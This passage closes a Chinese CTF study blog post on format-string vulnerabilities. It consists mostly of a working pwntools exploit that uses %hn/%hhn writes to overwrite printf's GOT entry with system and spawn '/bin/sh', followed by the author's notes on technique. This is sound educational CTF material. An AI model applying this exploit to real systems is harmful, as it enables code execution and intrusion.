            print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point))
            break
    else :
        io.close()
        continue
def fmtshort(prev,val,idx,byte = 2):
    result = &quot;&quot;
    if prev &lt; val :
        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;
    elif prev == val :
        result += &#39;&#39;
    else :
        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;
    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;
    return result
def fmtbyte(prev,val,idx,byte = 1):
    result = &quot;&quot;
    if prev &lt; val :
        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;
    elif prev == val :
        result += &#39;&#39;
    else :
        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;
    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;
    return result
printf_got = 0x0804a014
key1 = int(hex(tag1_stack_point)[-4:],16)
key2 = int(hex(tag2_stack_point)[-4:],16)
info(&#39;--------change the two points to tag_stack_point:-------&#39;)
# raw_input(&#39;-&gt;&#39;)
prev = 0
payload = &quot;&quot;
for i in range(1):
    payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i) 
    prev = (key1 &gt;&gt; i*16) &amp; 0xffff
for i in range(1):
    payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i) 
    prev = (key2 &gt;&gt; i*16) &amp; 0xffff
payload = payload + &#39;1111&#39;
io.sendline(payload)
io.recvuntil(&#39;1111&#39;)
info(&#39;--------change got_table to printf_got:-------&#39;)
prev = 0 
payload = &quot;&quot;
key3 = 0x14
key4 = 0x16
for i in range(1):
    payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i) 
    prev = (key3 &gt;&gt; i*8) &amp; 0xff
for i in range(1):
    payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i) 
    prev = (key4 &gt;&gt; i*8) &amp; 0xff
payload = payload + &#39;2222&#39;
io.sendline(payload)
io.recvuntil(&#39;2222&#39;)
info(&#39;--------change printf_got to system_addr:-------&#39;)
raw_input(&#39;-&gt;&#39;)
prev = 0 
payload = &quot;&quot;
key5 = int(hex(system_addr)[-4:],16)
key6 = int(hex(system_addr)[2:6],16)
print(&#39;key5 -&gt; &#39; + hex(key5))
print(&#39;key6 -&gt; &#39; + hex(key6))
for i in range(1):
    payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i) 
    prev = (key5 &gt;&gt; i*16) &amp; 0xffff
for i in range(1):
    payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i) 
    prev = (key6 &gt;&gt; i*16) &amp; 0xffff
payload = payload + &#39;3333&#39;
io.sendline(payload)
sleep(1)
io.recvuntil(&#39;3333&#39;)
raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;)
io.sendline(&#39;/bin/sh\x00\x00\x00\x00\x00\x00&#39;)
io.interactive()</code></pre>
<p>这个exp的难点在于：</p>
<ul>
<li>注意去定位到合适的栈结构再去利用</li>
<li>尽量充分利用每一次的printf</li>
<li>单次printf多次写入</li>
<li>注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。</li>
</ul>
<h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>通过这两个例题说明，面对fmt的buf不在栈上时，归根结底也就是一定要学会<strong>灵活、充分的利用栈上的数据</strong>,单纯的ebp链只是适合简单的情况。</p>
<p>但是也是做题时，也是一定要优先考虑ebp链是否能利用，因为ebp链构成的话，它的相对偏移就是<strong>针对性程序本身的</strong>，基本不会受到libc版本的影响，用起来很好用，要优先考虑。</p>
<p>还有就是面对这种会<strong>有随机栈情况、没有ebp链</strong>的题目，一定要注意本地和远程的libc版本、注意环境,因为这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。</p>

            <hr>
          </div>
          <br>
          <div>
            <p>
            
            
              <span>
                <i class="iconfont icon-tag"></i>
                
                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
                
                  <a class="hover-with-bg" href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">学习记录</a>
                
              </span>
            
            </p>
            
              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
            
          </div>
        </div>
      </div>
    </div>
    <div class="d-none d-lg-block col-lg-2 toc-container">
      
  <div id="toc">
    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
    <div id="tocbot"></div>
  </div>

    </div>
  </div>
</div>

<!-- custom -->


<!-- Comments -->
<div class="col-lg-7 mx-auto nopadding-md">
  <div class="container comments mx-auto" id="comments">
    
  </div>
</div>

    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  <footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    <br>

    
  
    <!-- 不蒜子统计PV -->
    
    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
  
  
    <!-- 不蒜子统计UV -->
    
    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
  
  <br>



    


    <!-- cnzz Analytics icon -->
    

  </div>
</footer>

<!-- SCRIPTS -->
<script src="/lib/jquery/jquery.min.js" ></script>
<script src="/lib/popper/popper.min.js" ></script>
<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
<script src="/js/main.js" ></script>


  <script src="/js/lazyload.js" ></script>



  
    <script src="/lib/tocbot/tocbot.min.js" ></script>
  
  <script src="/js/post.js" ></script>



  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>



  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>


<!-- Plugins -->


  

  

  

  

  <!-- cnzz Analytics -->
  



  <script src="/lib/prettify/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="/lib/typed/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "格式化字符串漏洞小总结（下）&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="/lib/anchor/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "false",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>





  
  
    <script type="text/javascript">
      //定义获取词语下标
      var a_idx = 0;
      jQuery(document).ready(function ($) {
        //点击body时触发事件
        $("body").click(function (e) {
          //需要显示的词语
          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
          //设置词语给span标签
          var $i = $("<span/>").text(a[a_idx]);
          //下标等于原来下标+1  余 词语总数
          a_idx = (a_idx + 1) % a.length;
          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
          //获取x和y的指针坐标
          var x = e.pageX, y = e.pageY;
          //在鼠标的指针的位置给$i定义的span标签添加css样式
          $i.css({
            "z-index": 999,
            "top": y - 20,
            "left": x,
            "position": "absolute",
            "font-weight": "bold",
            "color": rand_color()
          });
          // 随机颜色
          function rand_color() {
            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
          }
          //在body添加这个标签
          $("body").append($i);
          //animate() 方法执行 CSS 属性集的自定义动画。
          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
          $i.animate({
            //将原来的位置向上移动180
            "top": y - 180,
            "opacity": 0
            //1500动画的速度
          }, 1500, function () {
            //时间到了自动删除
            $i.remove();
          });
        });
      })
      ;
    </script>
  








</body>
</html>
